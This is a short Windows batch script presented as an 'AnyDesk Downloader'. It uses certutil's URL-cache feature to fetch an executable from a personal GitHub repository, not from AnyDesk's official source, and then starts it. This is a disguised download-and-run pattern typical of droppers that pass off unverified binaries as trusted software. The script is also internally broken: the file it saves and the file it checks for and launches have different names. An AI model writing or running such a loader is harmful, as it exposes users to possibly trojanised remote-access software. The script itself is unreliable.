@echo off
echo ================================
echo    AnyDesk Downloader
echo ================================
echo.
echo Downloading AnyDesk...
echo.

certutil.exe -urlcache -f https://raw.githubusercontent.com/beer32/S1/refs/heads/main/anydesk-9-6.exe C:\AnyDesk96.exe

echo.
if exist C:\AnyDesk.exe (
    echo DOWNLOAD SUCCESSFUL!
    echo  File: C:\AnyDesk.exe
    echo.
    echo Starting AnyDesk in 3 seconds...
    timeout /t 3 /nobreak >nul
    start C:\AnyDesk.exe
    echo AnyDesk is now starting...
) else (
    echo DOWNLOAD FAILED!
    echo Please check your internet connection.
    echo.
)

echo ================================
echo Press any key to close this window...
echo ================================
pause >nul